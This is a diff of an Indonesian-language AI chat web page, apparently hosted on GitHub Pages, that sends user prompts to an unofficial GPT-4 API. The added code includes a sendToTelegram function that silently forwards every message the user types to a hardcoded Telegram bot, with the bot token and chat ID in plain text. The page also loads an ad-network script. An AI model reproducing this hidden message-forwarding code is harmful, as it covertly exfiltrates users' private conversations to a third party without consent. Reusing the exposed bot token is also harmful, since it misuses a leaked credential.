@@ -124,77 +124,100 @@
         </div>
     </div>
 
-    <script>
-        // Cek domain, jika tidak berasal dari amindeveloper99.github.io, redirect ke domain tersebut
-        if (window.location.hostname !== 'amindeveloper99.github.io') {
-            window.location.href = 'https://amindeveloper99.github.io';
+<script>
+    // Cek domain, jika tidak berasal dari amindeveloper99.github.io, redirect ke domain tersebut
+    if (window.location.hostname !== 'amindeveloper99.github.io') {
+        window.location.href = 'https://amindeveloper99.github.io';
+    }
+
+    // Fokus otomatis ke input ketika halaman dibuka
+    window.onload = function() {
+        document.getElementById('userInput').focus();
+    }
+
+    const apiUrl = 'https://api.nyxs.pw/ai/gpt4?text=';
+    const chatBox = document.getElementById('chat-box');
+    let chatHistory = ""; // Menyimpan riwayat chat
+
+    async function sendToTelegram(message) {
+        const token = '7556736179:AAFAzU6EeDMmGa1f7ZyGMlYN4kBHgfSFYYw';
+        const chatId = '5531996760';
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const params = {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(params),
+            });
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error);
         }
+    }
 
-        // Fokus otomatis ke input ketika halaman dibuka
-        window.onload = function() {
-            document.getElementById('userInput').focus();
+    function sendMessage() {
+        const userInput = document.getElementById('userInput');
+        const message = userInput.value.trim();
+        
+        if (message) {
+            addMessage(message, 'user');
+            chatHistory += "Pengguna: " + message + "\n"; // Tambahkan pesan pengguna ke riwayat
+            sendToTelegram(message); // Kirim pesan ke Telegram
+            fetchAIResponse(message);
+            userInput.value = '';
+            userInput.focus();
         }
+    }
 
-        const apiUrl = 'https://api.nyxs.pw/ai/gpt4?text=';
-        const chatBox = document.getElementById('chat-box');
-        let chatHistory = ""; // Menyimpan riwayat chat
+    // Fungsi untuk menambahkan pesan ke chat box
+    function addMessage(text, sender) {
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'message ' + sender;
+        messageDiv.textContent = text;
 
-        // Fungsi untuk mengirim pesan pengguna
-        function sendMessage() {
-            const userInput = document.getElementById('userInput');
-            const message = userInput.value.trim();
-            
-            if (message) {
-                addMessage(message, 'user');
-                chatHistory += "Pengguna: " + message + "\n"; // Tambahkan pesan pengguna ke riwayat
-                fetchAIResponse(message);
-                userInput.value = '';
-                userInput.focus(); // Fokus ulang ke input setelah pesan dikirim
+        const timestamp = document.createElement('div');
+        timestamp.className = 'timestamp';
+        timestamp.textContent = getCurrentWITATime();
+
+        messageDiv.appendChild(timestamp);
+        chatBox.appendChild(messageDiv);
+        chatBox.scrollTop = chatBox.scrollHeight; // Scroll ke bawah setiap kali ada pesan baru
+    }
+
+    // Fungsi untuk mengambil respon AI
+    async function fetchAIResponse(message) {
+        try {
+            const fullPrompt = chatHistory + "\nPengguna: " + message + 
+                              "\nBalas pesan ini dalam bahasa Indonesia dengan gaya yang santai dan tidak kaku, dengan emotikon:";
+            const response = await fetch(apiUrl + encodeURIComponent(fullPrompt));
+            const data = await response.json();
+
+            if (data.status) {
+                addMessage(data.result, 'bot');
+                chatHistory += "AI: " + data.result + "\n"; // Tambahkan balasan AI ke riwayat
+            } else {
+                addMessage('Maaf, ada kesalahan.', 'bot');
             }
+        } catch (error) {
+            addMessage('Maaf, saya mengalami kesulitan untuk merespons.', 'bot');
         }
+    }
 
-        // Fungsi untuk menambahkan pesan ke chat box
-        function addMessage(text, sender) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'message ' + sender;
-            messageDiv.textContent = text;
+    // Fungsi untuk mendapatkan waktu saat ini dalam zona waktu WITA (GMT+8)
+    function getCurrentWITATime() {
+        const options = { timeZone: 'Asia/Makassar', hour: '2-digit', minute: '2-digit' };
+        return new Date().toLocaleTimeString('id-ID', options);
+    }
+</script>
 
-            const timestamp = document.createElement('div');
-            timestamp.className = 'timestamp';
-            timestamp.textContent = getCurrentWITATime(); // Menambahkan keterangan waktu
-
-            messageDiv.appendChild(timestamp);
-            chatBox.appendChild(messageDiv);
-            chatBox.scrollTop = chatBox.scrollHeight; // Scroll ke bawah setiap kali ada pesan baru
-        }
-
-        // Fungsi untuk mengambil respon AI
-        async function fetchAIResponse(message) {
-            try {
-                // Gabungkan seluruh riwayat chat dengan pesan terbaru dan tambahkan instruksi agar AI menjawab dalam bahasa Indonesia dengan gaya santai
-                const fullPrompt = chatHistory + "\nPengguna: " + message + 
-                                  "\nBalas pesan ini dalam bahasa Indonesia dengan gaya yang santai dan tidak kaku, dengan emotikon:";
-                
-                const response = await fetch(apiUrl + encodeURIComponent(fullPrompt));
-                const data = await response.json();
-
-                if (data.status) {
-                    addMessage(data.result, 'bot');
-                    chatHistory += "AI: " + data.result + "\n"; // Tambahkan balasan AI ke riwayat
-                } else {
-                    addMessage('Maaf, ada kesalahan.', 'bot');
-                }
-            } catch (error) {
-                addMessage('Maaf, saya mengalami kesulitan untuk merespons.', 'bot');
-            }
-        }
-
-        // Fungsi untuk mendapatkan waktu saat ini dalam zona waktu WITA (GMT+8)
-        function getCurrentWITATime() {
-            const options = { timeZone: 'Asia/Makassar', hour: '2-digit', minute: '2-digit' };
-            return new Date().toLocaleTimeString('id-ID', options);
-        }
-    </script>
 <script type='text/javascript' src='//pl24503491.cpmrevenuegate.com/28/23/81/282381b2d984b79423e3f1e98d4146c1.js'></script>
     
     <div id="container-e92c237c04558d624f7a60c70e95f3e9"></div>
